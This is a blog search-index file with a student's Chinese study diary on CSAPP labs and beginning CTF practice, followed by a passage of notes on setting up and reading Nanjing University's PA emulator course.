<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[桜の日記] 樱花抄</title>
      <link href="/9999/05/21/%E6%A8%B1%E8%8A%B1%E6%8A%84/"/>
      <url>/9999/05/21/%E6%A8%B1%E8%8A%B1%E6%8A%84/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/06/16/KGNaVnAbWr1gPOk.png" alt="image-20210616004655959"></p><p>学习周报：<a href="https://github.com/Kazamayc/twzl_learning">https://github.com/Kazamayc/twzl_learning</a></p><h1 id="2021-摸鱼日报"><a href="#2021-摸鱼日报" class="headerlink" title="2021 摸鱼日报"></a>2021 摸鱼日报</h1><h2 id="2-19-正月初九-备考"><a href="#2-19-正月初九-备考" class="headerlink" title="2-19-正月初九-备考"></a>2-19-正月初九-备考</h2><p>做attack lab，理解了code-injection的原理。</p><h2 id="2-20-正月初十-备考"><a href="#2-20-正月初十-备考" class="headerlink" title="2-20-正月初十-备考"></a>2-20-正月初十-备考</h2><p>完成attack lab，以及读csapp第四章。熟悉了ROP攻击<br>说来下周想看看南大的计算机基础课程，之前因为是32位的不想看(</p><h2 id="2-21-正月十一-备考"><a href="#2-21-正月十一-备考" class="headerlink" title="2-21-正月十一-备考"></a>2-21-正月十一-备考</h2><p>今天回学校提交高考资料，下午要去补数学，所以二进制只能摸鱼了。</p><h2 id="2-22-正月十二-备考"><a href="#2-22-正月十二-备考" class="headerlink" title="2-22-正月十二-备考"></a>2-22-正月十二-备考</h2><p>4月24春考，不摸🐟了，先准备高考了。考完了再回来学，不过应该还是会抽空看看南大的计算机</p><p><img src="https://i.loli.net/2021/02/22/fFhroublmJR59Xn.png" alt="img"></p><h2 id="2-23-正月十三-高考倒计时59天"><a href="#2-23-正月十三-高考倒计时59天" class="headerlink" title="2-23-正月十三-高考倒计时59天"></a>2-23-正月十三-高考倒计时59天</h2><p>今天的数学题有些难，做了好久（主要还是因为摸🐟<br>不学计算机进度反而变慢了，明天要认真起来！</p><h2 id="2-24-正月十四-高考倒计时58天"><a href="#2-24-正月十四-高考倒计时58天" class="headerlink" title="2-24-正月十四-高考倒计时58天"></a>2-24-正月十四-高考倒计时58天</h2><p>摸鱼</p><h2 id="3-22-二月初十-备考"><a href="#3-22-二月初十-备考" class="headerlink" title="3-22-二月初十-备考"></a>3-22-二月初十-备考</h2><p>在群里的深夜学习，计算机真的奇妙：<a href="https://www.oreilly.com/library/view/c-in-a/0596006977/ch04.html">https://www.oreilly.com/library/view/c-in-a/0596006977/ch04.html</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//论是否会执行</span></span><br><span class="line"><span class="keyword">int</span> a=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> a=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h3 id="算数类型转换规则（usual-arithmetic-conversions）"><a href="#算数类型转换规则（usual-arithmetic-conversions）" class="headerlink" title="算数类型转换规则（usual arithmetic conversions）"></a>算数类型转换规则（usual arithmetic conversions）</h3><p>1.浮点优先<br>2.如果两个操作数都是整数，则首先对两个操作数执行整数提升。如果在整数提升之后操作数仍然具有不同的类型，则转换将继续如下:<br>  - 如果操作数之一有unsigned类型T，且转换等级高于另一个操作数的类型，则另一个操作数的类型转换为T。<br>  - 否则，如果操作数之一有带符号类型T，且其转换等级高于另一操作数的类型。<strong>仅当类型T能够表示另一操作数类型的所有值时，另一个操作数才转换为类型T。</strong><br>  如果不是，则将两个操作数都转换为与带符号类型T对应的无符号类型。</p></blockquote><h2 id="4-10-二月廿九-备考"><a href="#4-10-二月廿九-备考" class="headerlink" title="4-10-二月廿九-备考"></a>4-10-二月廿九-备考</h2><p>这两天把南大计算机第一章看了看，顺便把之前写过的部分笔记放到了blog上</p><h2 id="5-9-三月廿八-充满希望的暑假"><a href="#5-9-三月廿八-充满希望的暑假" class="headerlink" title="5-9-三月廿八-充满希望的暑假"></a>5-9-三月廿八-充满希望的暑假</h2><p>高考结束了，明天开始学习啦。</p><h2 id="5-10-三月廿九-暑假"><a href="#5-10-三月廿九-暑假" class="headerlink" title="5-10-三月廿九-暑假"></a>5-10-三月廿九-暑假</h2><p>今天调了一下午环境，累死了，早睡早起</p><h2 id="5-11-三月三十-暑假"><a href="#5-11-三月三十-暑假" class="headerlink" title="5-11-三月三十-暑假"></a>5-11-三月三十-暑假</h2><ul><li>学习生活步入正轨啦，今天把csapp第七章刷了一遍，感觉什么也没记住。</li><li>所以就想写一个<a href="https://kazamayc.github.io/2021/05/11/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0-x-%E6%88%91-%E2%88%9A-%E6%9E%84%E5%BB%BA%E7%BC%96%E8%AF%91%E5%99%A8/">编译器</a>玩，把之前在知乎收藏的教程拿出来康一康。</li><li>把csapp学完，然后就开始一遍学ctf一遍学天问吧。开学前想面个联合战队打打ctf。</li><li>顺便拾起来一直想学但是没时间的<a href="https://www.bilibili.com/video/BV1Bp4y1D747">日语</a>，就一天1课新标日吧。</li></ul><h2 id="5-12-四月初一-暑假"><a href="#5-12-四月初一-暑假" class="headerlink" title="5-12-四月初一-暑假"></a>5-12-四月初一-暑假</h2><p>今天还是在看编译器，把前三章的代码看懂了。明天尽量肝完，后天开始学shell lab。</p><h2 id="5-13-四月初二-暑假"><a href="#5-13-四月初二-暑假" class="headerlink" title="5-13-四月初二-暑假"></a>5-13-四月初二-暑假</h2><ul><li>今天把编译器(×)解释器(√)过了一遍，然后开始接着看csapp。</li></ul><h2 id="5-14-四月初三-暑假"><a href="#5-14-四月初三-暑假" class="headerlink" title="5-14-四月初三-暑假"></a>5-14-四月初三-暑假</h2><ul><li>日语变成两天一课，一天看网课，一天背课文。不然没时间肝计算机了。</li><li>下午看了会小说，ごめんなさい，私は懒狗でし。</li><li>晚上被waitpid折磨了，理解了一晚上才懂这玩意到底是干嘛的。</li><li>争取明天看完第八章(如果没有太多难理解的waitpid的话orz)</li></ul><h2 id="5-15-四月初四-暑假"><a href="#5-15-四月初四-暑假" class="headerlink" title="5-15-四月初四-暑假"></a>5-15-四月初四-暑假</h2><p>第八章勉强看完，后面看的不怎么细致，明天做完shell lab应该就没大问题了。</p><h2 id="5-16-四月初五-暑假"><a href="#5-16-四月初五-暑假" class="headerlink" title="5-16-四月初五-暑假"></a>5-16-四月初五-暑假</h2><ul><li>shell lab写不出来，打算明天照着别人的抄抄，然后理解一下。</li></ul><h2 id="5-17-四月初六-暑假"><a href="#5-17-四月初六-暑假" class="headerlink" title="5-17-四月初六-暑假"></a>5-17-四月初六-暑假</h2><ul><li>静下心来之后，shell lab其实也没啥难度，昨天是我心乱了。明天大概能写完+理解完shell lab。</li><li>明天开始晨跑🏃‍🏃‍🏃‍</li><li>日语学习仍然在进行中(`ヮ´)</li></ul><h2 id="5-18-四月初七-暑假"><a href="#5-18-四月初七-暑假" class="headerlink" title="5-18-四月初七-暑假"></a>5-18-四月初七-暑假</h2><ul><li>长时间没🏃‍差点把自己跑没了，多跑跑大概就好了。</li><li>然后shell lab写完了，明天再次暂停csapp，我要去给ctf入个门(ﾟ3ﾟ)</li></ul><h2 id="5-19-四月初八-暑假"><a href="#5-19-四月初八-暑假" class="headerlink" title="5-19-四月初八-暑假"></a>5-19-四月初八-暑假</h2><ul><li>今天在啃nu1l的0到1。</li></ul><h2 id="5-20-四月初九-暑假"><a href="#5-20-四月初九-暑假" class="headerlink" title="5-20-四月初九-暑假"></a>5-20-四月初九-暑假</h2><ul><li>因为🌧所以没🏃‍🏃‍</li><li>日语学完前三章，没背单词只背了背课文。语法是什么，わかりません(ゝ∀･)</li><li>配置ubuntu环境，然后学了学ida怎么用。话说这两天学的好慢，全把时间浪费在搭环境上了。</li></ul><h2 id="5-21-四月初十-暑假"><a href="#5-21-四月初十-暑假" class="headerlink" title="5-21-四月初十-暑假"></a>5-21-四月初十-暑假</h2><ul><li>因为pwntools，被Ubuntu和python3折腾了一下午。我决定放弃Ubuntu，换回kali。</li></ul><h2 id="5-22-四月十一-摸鱼"><a href="#5-22-四月十一-摸鱼" class="headerlink" title="5-22-四月十一-摸鱼"></a>5-22-四月十一-摸鱼</h2><ul><li>今天有点累，下午在睡觉。</li><li>这几天进度实在有些慢，明天调整一下。(・_ゝ・)</li></ul><h2 id="5-23-四月十二-暑假"><a href="#5-23-四月十二-暑假" class="headerlink" title="5-23-四月十二-暑假"></a>5-23-四月十二-暑假</h2><ul><li>pwn的0到1</li></ul><h2 id="5-24-四月十三-暑假"><a href="#5-24-四月十三-暑假" class="headerlink" title="5-24-四月十三-暑假"></a>5-24-四月十三-暑假</h2><ul><li>刷题，日语滞后</li></ul><h2 id="5-25-四月十四-暑假"><a href="#5-25-四月十四-暑假" class="headerlink" title="5-25-四月十四-暑假"></a>5-25-四月十四-暑假</h2><p>今天刷了几道栈溢出和rop，然后N1那道rop到现在没做出来，直接复制wp都失败。调了好几天了，明天再调不出来就拜拜。</p><h2 id="5-26-四月十五-暑假"><a href="#5-26-四月十五-暑假" class="headerlink" title="5-26-四月十五-暑假"></a>5-26-四月十五-暑假</h2><p>一边学ctfwiki一边做题</p><h2 id="5-27-四月十六-暑假"><a href="#5-27-四月十六-暑假" class="headerlink" title="5-27-四月十六-暑假"></a>5-27-四月十六-暑假</h2><ul><li><p>ctfwiki，把python3的环境配置好了。</p></li><li><p>现在的感觉是，wp原理看懂了，但是题调不出来。我感觉是环境原因，或许再看几天就好了。</p></li><li><p>这几天收获很多，且有成就感。果然还是边做边学会好一点。</p></li></ul><p><code>月が绮丽ですね</code></p><p><img src="https://i.loli.net/2021/05/27/YVCOhblLFUGjzXf.png" alt="image-20210527223630526"></p><h2 id="5-28-四月十七-暑假"><a href="#5-28-四月十七-暑假" class="headerlink" title="5-28-四月十七-暑假"></a>5-28-四月十七-暑假</h2><p><a href="https://y.qq.com/n/ryqq/songDetail/001NS0sK21felt">https://y.qq.com/n/ryqq/songDetail/001NS0sK21felt</a></p><p><img src="https://i.loli.net/2021/05/28/CgT9IwvBeHpi4UG.jpg" alt="1"></p><h2 id="5-29-四月十八-暑假"><a href="#5-29-四月十八-暑假" class="headerlink" title="5-29-四月十八-暑假"></a>5-29-四月十八-暑假</h2><p>今天终于把ret2libc打通了，之前在本地打不通的原因是libc不同。果然不是我的问题(;´Д`)</p><h2 id="5-30-四月十九-岁不淹兮，十七又一"><a href="#5-30-四月十九-岁不淹兮，十七又一" class="headerlink" title="5-30-四月十九-岁不淹兮，十七又一"></a>5-30-四月十九-岁不淹兮，十七又一</h2><p>今天调了调之前那道ROP，本地调出来了，远程却一直打不通。看了看N师傅把N1book的题都打了，但是这个题没打，我感觉应该不是我的问题。花了好几天的时间啃这个题(・_ゝ・)</p><p>不过还是学到了点东西，在本地调试的时候，覆盖返回地址一直无法成功，然后跟着ida调试的时候发现，它会到一个地址检测是否溢出，如果溢出会中断然后发送信号。然后我就把那个验证的地址也给覆盖了，然后就没问题了。</p><h2 id="5-31-四月二十-暑假"><a href="#5-31-四月二十-暑假" class="headerlink" title="5-31-四月二十-暑假"></a>5-31-四月二十-暑假</h2><p>今个事多，摸了。</p><h2 id="6-1-儿童节-暑假"><a href="#6-1-儿童节-暑假" class="headerlink" title="6-1-儿童节-暑假"></a>6-1-儿童节-暑假</h2><p>今天把格式化字符串漏洞搞明白了，前两天看了好多视频文章，一直没弄明白他们是怎么知道第几个参数是我们要找的值的。</p><p>直到我看到了这篇<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">文章</a>，原来可以用穷举。穷举推出位置之后，在gdb里找就可以了。</p><h2 id="6-2-四月廿二-暑假"><a href="#6-2-四月廿二-暑假" class="headerlink" title="6-2-四月廿二-暑假"></a>6-2-四月廿二-暑假</h2><p>下午调了一道rop一道格式化字符串，学到了mprotect函数修改内存权限，收获多多。</p><p>不过现在才发现一件事情，其实应该早点上手做题的，之前看过的那些计算机基础掌握的也不扎实，因为不知道会在哪里用到。感觉之前看的书还得从头翻一遍。明天没大问题就开始看堆了。</p><h2 id="6-3-四月廿三-暑假"><a href="#6-3-四月廿三-暑假" class="headerlink" title="6-3-四月廿三-暑假"></a>6-3-四月廿三-暑假</h2><p>今天在看csapp的第九章。</p><h2 id="6-4-四月廿四-暑假"><a href="#6-4-四月廿四-暑假" class="headerlink" title="6-4-四月廿四-暑假"></a>6-4-四月廿四-暑假</h2><p>推明日方舟，摸了</p><h2 id="6-6-四月廿六-芒种"><a href="#6-6-四月廿六-芒种" class="headerlink" title="6-6-四月廿六-芒种"></a>6-6-四月廿六-芒种</h2><p>今天刷科目一，抠字眼的题有啥好做的…醉了</p><p>这两天玩也没玩爽，还没认真学。还是调整一下回归学习状态吧。</p><p>然后就祝兄弟们高考顺利吧(晚上没吃饱现在又饿了，睡觉睡觉)</p><p><img src="https://i.loli.net/2021/06/06/bTCDNdFjrutYLA1.jpg" alt="img"></p><h2 id="6-7-四月廿七-暑假"><a href="#6-7-四月廿七-暑假" class="headerlink" title="6-7-四月廿七-暑假"></a>6-7-四月廿七-暑假</h2><p>书实在是难啃，最后对着南大的视频一点一点学的。哎好难。</p><p>明天要去医院和驾校，学习时间减减。惨惨</p><h2 id="6-9-四月廿九-暑假"><a href="#6-9-四月廿九-暑假" class="headerlink" title="6-9-四月廿九-暑假"></a>6-9-四月廿九-暑假</h2><p>这两天一直刷题，等遇到瓶颈了再做别的。实在是看不动书了。</p><h2 id="6-10-五月初一-暑假"><a href="#6-10-五月初一-暑假" class="headerlink" title="6-10-五月初一-暑假"></a>6-10-五月初一-暑假</h2><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/">https://nju-projectn.github.io/ics-pa-gitbook/ics2019/</a></p><p>总之接下来就跟着PA学学计算机基础，从头开始，不要心急，然后每天固定刷两道题</p><p>最后在南大的PA看到一句不错的话，<strong>如果你抱着不愿意付出任何学习成本的心态, 就无法享受到工具带来的便利。</strong></p><h2 id="6-11-五月初二-暑假"><a href="#6-11-五月初二-暑假" class="headerlink" title="6-11-五月初二-暑假"></a>6-11-五月初二-暑假</h2><p>弄了一整天，终于把这该死的环境配好了。等待环境的过程中，无聊的刷了buu和htb几道题。</p><p>明天大概要和朋友们一起玩。</p><h2 id="6-13-五月初四-暑假"><a href="#6-13-五月初四-暑假" class="headerlink" title="6-13-五月初四-暑假"></a>6-13-五月初四-暑假</h2><p>最近事情要开始变多起来了，不过把电脑修好了(之前系统重装后，一直没安小米的驱动，导致性能巨低，我还以为电脑硬件坏了，我是伞兵)</p><h2 id="6-15-五月初六-暑假"><a href="#6-15-五月初六-暑假" class="headerlink" title="6-15-五月初六-暑假"></a>6-15-五月初六-暑假</h2><p>明天考科一，因为这几天身体不适，实在是没心思去看理论了，所以就刷了刷题。</p><p>这几天忙完了准备去医院看看。</p><p><img src="https://i.loli.net/2021/06/15/Ji6yz3PRHQMsZ7q.png" alt="image-20210615234721788"></p><h2 id="6-16-五月初七-暑假"><a href="#6-16-五月初七-暑假" class="headerlink" title="6-16-五月初七-暑假"></a>6-16-五月初七-暑假</h2><p>科目一有手就行，明天去医院，如果心情ok的话就准备接着学习啦，不ok就再歇几天。瘫了最近。</p><p>心情不好还是要躺平，开心最重要，压力不要太大。(一直摸鱼，周报都没啥好写的了)</p><h2 id="6-22-五月十三-暑假"><a href="#6-22-五月十三-暑假" class="headerlink" title="6-22-五月十三-暑假"></a>6-22-五月十三-暑假</h2><p>今年七月的新番简直无敌了。</p><p>明天回学校看老师，最近已经开始学习了。明天之后回归状态冲冲冲。</p><h2 id="6-25-五月十六-暑假"><a href="#6-25-五月十六-暑假" class="headerlink" title="6-25-五月十六-暑假"></a>6-25-五月十六-暑假</h2><ul><li><p>春考拔尖人才189分，舒服了舒服了。济南我来啦。</p></li><li><p>近来的运气简直爆表了，要更努力一点才对得起这些机遇。</p></li><li><p>这几天把nemu的前四个函数看完了，明天把寄存器的结构体写完。</p></li><li><p>总结一下目前的理解。大概就是首先分析参数，然后把log文件打开，然后读取image，如果我们不给image，它就会自动读取一段客户程序到约定好的虚拟内存0x100000。这样做的原因是不需要通过bios进行初始化，直接让CPU按照约定执行。然后我们记录程序的物理地址，最后初始化寄存器pc，让它指向程序的物理地址。(这里应该还会有地址映射的相关内容，最终指向的应该是0x100000的那个客户程序)</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/2021/06/26/categories/"/>
      <url>/2021/06/26/categories/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] 南京大学PA学习</title>
      <link href="/2021/06/10/%C2%96%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6PA%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/06/10/%C2%96%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6PA%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="PA0-世界诞生的前夜"><a href="#PA0-世界诞生的前夜" class="headerlink" title="PA0-世界诞生的前夜"></a>PA0-世界诞生的前夜</h1><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/">https://nju-projectn.github.io/ics-pa-gitbook/ics2019/</a></p><p>本文仅仅是对笔者自己知识遗漏的一个补充，可以辅助本文学习PA，但请不要只看本文。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>我安装了一个debian10，这个怎么装就不说了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.tuna.tsinghua.edu.cn/debian/ stable main&quot;</span> &gt; /etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install build-essential</span><br><span class="line">apt-get install man</span><br><span class="line">apt-get install net-tools</span><br><span class="line">apt-get install vim </span><br><span class="line">apt-get install gdb</span><br><span class="line">apt-get install git</span><br><span class="line">apt-get install libreadline-dev</span><br><span class="line">apt-get install libsdl2-dev</span><br><span class="line">apt-get install libc6-dev-i386</span><br><span class="line">apt-get install qemu-system</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> -b 2019 https://github.com/NJU-ProjectN/ics-pa.git ics2019</span><br><span class="line">git config --global user.name <span class="string">&quot;kazamayc&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;kazamayc@gmail.com&quot;</span></span><br><span class="line">git config --global core.editor vim</span><br><span class="line">git config --global color.ui <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">bash init.sh</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">make                     <span class="comment">#在nemu文件夹下</span></span><br></pre></td></tr></table></figure><h2 id="tmux使用"><a href="#tmux使用" class="headerlink" title="tmux使用"></a>tmux使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">tmux                     创建新会话</span><br><span class="line">exit和ctrl+d             关闭会话</span><br><span class="line">ctrl+b d                 退出当前会话，但是不关闭，仍在后台运行</span><br><span class="line">ctrl+b s                 列出所有会话，这里的切换上下可以用vim语法(太贴心了)</span><br><span class="line">ctrl+b $                 重命名当前会话</span><br><span class="line">ctrl+b %                 划分左右两个会话</span><br><span class="line">ctrl+b &quot;                 划分上下两个会话</span><br><span class="line">ctrl+b ;                 切换到上一个会话</span><br><span class="line">ctrl+b o                 切换到下一个会话</span><br><span class="line">ctrl+b &#123;                 当前会话与上一个会话交换位置</span><br><span class="line">ctrl+b &#125;                 当前会话和下一个会话交换位置</span><br><span class="line">ctrl+b ctrl+o            所有会话向后移动一个位置，最后一个会话变成第一个会话</span><br><span class="line">ctrl+b !                 把当前会话拆分成一个</span><br><span class="line">ctrl+b z                 把当前会话全屏显示，再用一次会恢复大小</span><br><span class="line">ctrl+b q                 显示会话编号</span><br><span class="line">ctrl+b c                 创建一个新会话</span><br><span class="line">ctrl+b p                 切换到上一个会话</span><br><span class="line">ctrl+b n                 切换到下一个会话</span><br><span class="line">ctrl+b &lt;num&gt;             切换到指定编号的窗口</span><br><span class="line">ctrl+b w                 从列表中选择会话</span><br><span class="line">ctrl+b ,                 会话重命名</span><br></pre></td></tr></table></figure><h1 id="PA1-开天辟地的篇章"><a href="#PA1-开天辟地的篇章" class="headerlink" title="PA1-开天辟地的篇章"></a>PA1-开天辟地的篇章</h1><blockquote><p>task PA1.1: 实现单步执行, 打印寄存器状态, 扫描内存</p><p>task PA1.2: 实现算术表达式求值</p><p>task PA1.3: 实现所有要求, 提交完整的实验报告</p></blockquote><h2 id="1-如何玩超级马里奥"><a href="#1-如何玩超级马里奥" class="headerlink" title="1.)如何玩超级马里奥"></a>1.)如何玩超级马里奥</h2><ul><li>在<code>nexus-am/apps/litenes/</code>目录下执行<code>make rom</code>生成ROM<code>文件</code>，然后执行<code>make run mainargs=mario</code>就可以运行。</li><li>其他游戏查看<code>nexus-am/apps/litenes/src/roms/rom</code>的内容，然后对mainargs进行修改即可。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">操作方式:</span><br><span class="line"></span><br><span class="line">* T — SELECT</span><br><span class="line">* Y — START</span><br><span class="line">* G — A键</span><br><span class="line">* H — B键</span><br><span class="line">* W/S/A/D — UP/DOWN/LEFT/RIGHT</span><br></pre></td></tr></table></figure><h2 id="2-一台简单的计算机"><a href="#2-一台简单的计算机" class="headerlink" title="2.)一台简单的计算机"></a>2.)一台简单的计算机</h2><p>计算机运行的程序是由代码和数据组成的，而计算机是怎么运行程序的呢？</p><p>结构上， 一台简单的计算机要有存储程序的<strong>存储器</strong>，有用于暂存数据加快运算的<strong>寄存器</strong>，有用于计算的<strong>运算器</strong>，有永远指向当前执行指令的<strong>程序计数器PC</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  从PC指示的存储器位置取出指令;</span><br><span class="line">  执行指令;</span><br><span class="line">  更新PC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-框架代码初探"><a href="#3-框架代码初探" class="headerlink" title="3.)框架代码初探"></a>3.)框架代码初探</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ics2019</span><br><span class="line">├── init.sh       # 初始化脚本</span><br><span class="line">├── Makefile      # 用于工程打包提交</span><br><span class="line">├── nanos-lite    # 微型操作系统内核</span><br><span class="line">├── navy-apps     # 应用程序集</span><br><span class="line">├── nemu          # NEMU</span><br><span class="line">├── nexus-am      # 抽象计算机</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><p>目前我们只需要学习NEMU，NEMU主要由四个部分构成：monitor，CPU，memory，设备。它的功能是负责模拟出一套计算机硬件，让程序可以在其上运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">nemu</span><br><span class="line">├── include                    # 存放全局使用的头文件</span><br><span class="line">│   ├── common.h               # 公用的头文件</span><br><span class="line">│   ├── cpu</span><br><span class="line">│   │   ├── decode.h           # 译码相关</span><br><span class="line">│   │   └── exec.h             # 执行相关</span><br><span class="line">│   ├── debug.h                # 一些方便调试用的宏</span><br><span class="line">│   ├── device                 # 设备相关</span><br><span class="line">│   ├── macro.h                # 一些方便的宏定义</span><br><span class="line">│   ├── memory                 # 访问内存相关</span><br><span class="line">│   ├── monitor</span><br><span class="line">│   │   ├── expr.h             # 表达式求值相关</span><br><span class="line">│   │   ├── log.h              # 日志文件相关</span><br><span class="line">│   │   ├── monitor.h</span><br><span class="line">│   │   └── watchpoint.h       # 监视点相关</span><br><span class="line">│   ├── nemu.h</span><br><span class="line">│   └── rtl</span><br><span class="line">│       ├── rtl.h              # RTL基本指令</span><br><span class="line">│       └── rtl-wrapper.h</span><br><span class="line">├── Makefile                   # 指示NEMU的编译和链接</span><br><span class="line">├── Makefile.git               # git版本控制相关</span><br><span class="line">├── runall.sh                  # 一键测试脚本</span><br><span class="line">└── src                        # 源文件</span><br><span class="line">    ├── cpu</span><br><span class="line">    │   └── cpu.c              # 执行一条指令</span><br><span class="line">    ├── device                 # 设备相关</span><br><span class="line">    ├── isa                    # ISA相关的实现</span><br><span class="line">    │   ├── mips32</span><br><span class="line">    │   ├── riscv32</span><br><span class="line">    │   └── x86</span><br><span class="line">    ├── main.c                 # 你知道的...</span><br><span class="line">    ├── memory</span><br><span class="line">    │   └── memory.c           # 访问内存的接口函数</span><br><span class="line">    └── monitor</span><br><span class="line">        ├── cpu-exec.c         # 指令执行的主循环</span><br><span class="line">        ├── debug              # 简易调试器相关</span><br><span class="line">        │   ├── expr.c         # 表达式求值的实现</span><br><span class="line">        │   ├── log.c          # 日志文件相关</span><br><span class="line">        │   ├── ui.c           # 用户界面相关</span><br><span class="line">        │   └── watchpoint.c   # 监视点的实现</span><br><span class="line">        ├── diff-test</span><br><span class="line">        └── monitor.c</span><br></pre></td></tr></table></figure><h2 id="4-阅读NEMU代码"><a href="#4-阅读NEMU代码" class="headerlink" title="4.)阅读NEMU代码"></a>4.)阅读NEMU代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_monitor</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">char</span> *[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ui_mainloop</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Initialize the monitor. */</span></span><br><span class="line">  <span class="keyword">int</span> is_batch_mode = init_monitor(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receive commands from user. */</span></span><br><span class="line">  ui_mainloop(is_batch_mode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span 